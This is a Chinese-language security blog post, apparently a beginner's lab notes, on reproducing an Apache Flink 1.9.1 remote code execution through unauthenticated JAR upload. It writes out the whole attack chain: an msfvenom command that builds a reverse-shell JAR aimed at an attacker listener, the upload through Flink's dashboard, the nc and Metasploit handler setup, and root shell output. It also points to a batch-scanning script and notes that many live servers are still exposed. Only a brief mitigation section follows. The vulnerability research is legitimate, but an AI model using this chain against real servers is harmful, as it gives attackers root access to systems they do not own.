##  **0x01** **前言**

 **周三的时候，安全网站上看到有一个新爆出的关于Aapche
Flink的JAR包上传导致任意代码执行的漏洞。周四在看的时候已经出了一部分POC和抓取相关漏洞机器的代码，放在编译器里跑了一下好像不行。最后在周五的时候找了相关Apache环境复现一下这个漏洞。其实到现在漏洞出现才第二天，很多机器仍存在这个问题，谨慎使用，最后附上Github上批量检测脚本。**

如有错误的地方，请大佬们指出，我将马上更改，同时感谢各个平台大佬们发布的资料及文件。

##  **0x0** **2漏洞危险等级**

恶意JAR包上传，导致任意命令执行，反弹shell为root权限。

![](https://image.3001.net/images/20191116/1573881309_5dcf85dd6e9b6.png!small)

属于高危漏洞

##  **0x0** **3漏洞概述**

Apache Flink的任意Jar包上传导致远程代码执行的漏洞。攻击者只需要自己定制一个恶意jar上传，即可达到攻击目的。

**影响版本** :

> <= 1.9.1(最新版本)

**镜像下载地址** ：

> <https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-> scala_2.11.tgz>

**Apache Flink相关描述:**

> <https://www.jianshu.com/p/a4d0e00e313b>

##  **0x0** **4漏洞复现**

在网站上下载相关的版本的tgz包，解压到Kali上

![](https://image.3001.net/images/20191116/1573881327_5dcf85eff101c.png!small)

Cd 到解压文件的bin目录下

root@kali:~/Desktop/flink-1.9.1/bin# ./start-cluster.sh

Starting cluster.

Starting standalonesession daemon on host kali.

Starting taskexecutor daemon on host kali.

![](https://image.3001.net/images/20191116/1573881334_5dcf85f655dc7.png!small)

root@kali:~/Desktop/flink-1.9.1/bin# service apache2 start【开启Apache服务】

打开[http://ip](http://ip/)地址:8081进入apache flink的默认管理目录

![](https://image.3001.net/images/20191116/1573881338_5dcf85fa6ea23.png!small)

Kali生成恶意jar包,并且输出到桌面:

root@kali:~/Desktop/flink-1.9.1/bin# msfvenom -p java/shell_reverse_tcp
lhost=192.168.28.139 lport=5555 -f jar >/root/Desktop/shell.jar

![](https://image.3001.net/images/20191116/1573881354_5dcf860a0d921.png!small)

Cat shell.jsp也可以查看源码

![](https://image.3001.net/images/20191116/1573881359_5dcf860fe3cc4.png!small)

剩下要做的就是在默认的flink管理目录下点击submit new job上传恶意jar包

同时nc -nlvp 5555 ，监听5555端口

![](https://image.3001.net/images/20191116/1573881366_5dcf861654515.png!small)

![](https://image.3001.net/images/20191116/1573881371_5dcf861b45a2c.png!small)![](https://image.3001.net/images/20191116/1573881375_5dcf861f92da9.png!small)

![](https://image.3001.net/images/20191116/1573881379_5dcf862349707.png!small)

root@kali:~/Desktop/flink-1.9.1/bin# nc -nlvp 5555

listening on [any] 5555 ...

connect to [192.168.28.139] from (UNKNOWN) [192.168.28.139] 36302

id

uid=0(root) gid=0(root) 组=0(root)

whoami

root

pwd

/root/Desktop/flink-1.9.1/bin

![](https://image.3001.net/images/20191116/1573881385_5dcf86290c1cd.png!small)

成功反弹shell，同时是root权限

**第二种反弹shell的方式**

    
    
     msf5 > use exploit/multi/handler
    
        msf5 exploit(multi/handler) > set payload java/shell_reverse_tcp
    
        payload => java/shell_reverse_tcp
    
        msf5 exploit(multi/handler) > set lhost 192.168.28.139
    
        lhost => 192.168.28.139
    
        msf5 exploit(multi/handler) > set lport 5555
    
        lport => 5555
    
        msf5 exploit(multi/handler) > run

![](https://image.3001.net/images/20191116/1573881389_5dcf862d7af4f.png!small)

反弹shell

![](https://image.3001.net/images/20191116/1573881393_5dcf863141d0b.png!small)

导入python模块显示用户

![](https://image.3001.net/images/20191116/1573881397_5dcf86355a8ba.png!small)

##  **0x0** **5** **批量检测脚本**

Github源码网站：

> <https://github.com/AleWong/Apache-Flink-Web-Dashboard-RCE>

参考文献/资料来源:

> <https://blog.csdn.net/sun1318578251/article/details/103056168>
>
> <https://www.cnblogs.com/Cl0wn/p/11855160.html>

**Tips:** **漏洞前天才出来，现在仍有大量网站存在这样的漏洞，大佬们小心的玩。**

##  **0x0** **6漏洞修补**

对上传的jar包内容进行前端和后端校验

或者开设登录8081时界面的身份验证

更多专业的等方法，等补丁的发布。

小白第一次记录学习笔记，希望大佬们给予更多的建议和技术上的帮助。谢谢~

 ***本文作者： ShShroudroud，转载请注明来自FreeBuf.COM**  
  
  

